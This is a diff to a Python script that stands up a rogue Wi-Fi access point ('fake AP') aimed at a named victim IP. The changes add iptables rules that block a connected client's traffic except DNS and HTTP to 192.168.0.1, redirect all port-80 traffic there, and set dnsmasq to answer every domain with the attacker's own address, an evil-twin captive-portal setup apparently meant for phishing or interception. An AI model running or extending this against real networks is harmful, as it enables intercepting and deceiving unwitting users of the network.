@@ -109,23 +109,6 @@ def setup_interface(interface, ip_address):
     run_command(['sudo', 'ip', 'link', 'set', interface, 'up'])
     run_command(['sudo', 'ip', 'addr', 'add', f'{ip_address}/24', 'dev', interface])
 
-def setup_firewall_nftables(internet_interface):
-    """Setup firewall rules using nftables"""
-    print("[*] Setting up firewall rules (nftables)...")
-    
-    commands = [
-        ['sudo', 'nft', 'add', 'table', 'nat'],
-        ['sudo', 'nft', 'add', 'chain', 'nat', 'prerouting', '{ type nat hook prerouting priority -100 ; }'],
-        ['sudo', 'nft', 'add', 'chain', 'nat', 'postrouting', '{ type nat hook postrouting priority 100 ; }'],
-        ['sudo', 'nft', 'add', 'rule', 'nat', 'postrouting', 'oifname', f'"{internet_interface}"', 'masquerade']
-    ]
-    
-    for cmd in commands:
-        result = run_command(cmd, check=False)
-        if result.returncode != 0 and 'exists' not in result.stderr:
-            return False
-    return True
-
 def setup_firewall_iptables(ap_interface, internet_interface):
     """Setup firewall rules using iptables (fallback)"""
     print("[*] Setting up firewall rules (iptables)...")
@@ -134,7 +117,12 @@ def setup_firewall_iptables(ap_interface, internet_interface):
         ['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', internet_interface, '-j', 'MASQUERADE'],
         ['sudo', 'iptables', '-A', 'FORWARD', '-i', internet_interface, '-o', ap_interface, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'],
         ['sudo', 'iptables', '-A', 'FORWARD', '-i', ap_interface, '-o', internet_interface, '-j', 'ACCEPT'],
-        ['sudo', 'iptables', '-P', 'FORWARD', 'ACCEPT']
+        ['sudo', 'iptables', '-P', 'FORWARD', 'ACCEPT'],
+        ["iptables", "-A", "FORWARD", "-i", ap_interface, "-p", "udp", "--dport", "53", "-j" ,"ACCEPT"],
+        ["iptables", "-A", "FORWARD", "-i", ap_interface, "-p", "tcp", "--dport", '80',"-d", '192.168.0.1', "-j" ,"ACCEPT"],
+        ["iptables", "-A", "FORWARD", "-i", ap_interface, "-j" ,"DROP"],
+        ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", ap_interface, "-p", "tcp", "--dport", "80", "-j" ,"DNAT", "--to-destination", "192.168.0.1:80"]
+
     ]
     
     for cmd in commands:
@@ -152,7 +140,7 @@ def create_dnsmasq_config(ap_interface, ip_address, victim_ip_address):
     dhcp-range={victim_ip_address},{victim_ip_address},12h
     dhcp-option=6,{ip_address}
     dhcp-option=3,{ip_address}
-    address=/#/10.0.0.20
+    address=/#/{ip_address}\n
     """
     
     config_file = '/tmp/fake_ap_dnsmasq.conf'
@@ -235,12 +223,12 @@ def get_internet_interface():
                         return parts[i+1]
     
     # Fallback to common interfaces
-    for iface in ['enp2s0', 'enp0s3', 'ens33', 'wlan1']:
+    for iface in ['enp2s1110', 'enp0s3', 'ens33', 'wlan1']:
         result = run_command(['ip', 'link', 'show', iface], check=False)
         if result.returncode == 0:
             return iface
     
-    return 'enp2s0'  # Default fallback
+    return 'wlxe84e06afb969'  # Default fallback
 
 def create_fake_ap(ssid, channel, ap_interface, ap_ip_address, victim_ip):
     # Register signal handler
@@ -267,11 +255,9 @@ def create_fake_ap(ssid, channel, ap_interface, ap_ip_address, victim_ip):
     setup_ip_forwarding()
         
         # Setup firewall
-    if not setup_firewall_nftables(internet_interface):
-        print("[WARNING] nftables failed, trying iptables...")
-        setup_firewall_iptables(ap_interface, internet_interface)
-        
-        # Ensure internet interface has connectivity
+    setup_firewall_iptables(ap_interface, internet_interface)
+    
+
     print(f"[*] Ensuring {internet_interface} has connectivity...")
     run_command(['sudo', 'dhclient', internet_interface], check=False)
     
